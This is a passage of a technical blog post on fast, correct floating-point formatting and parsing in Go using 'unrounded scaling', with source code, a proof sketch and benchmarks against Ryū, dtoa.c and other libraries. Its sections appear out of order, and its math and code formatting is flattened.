p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 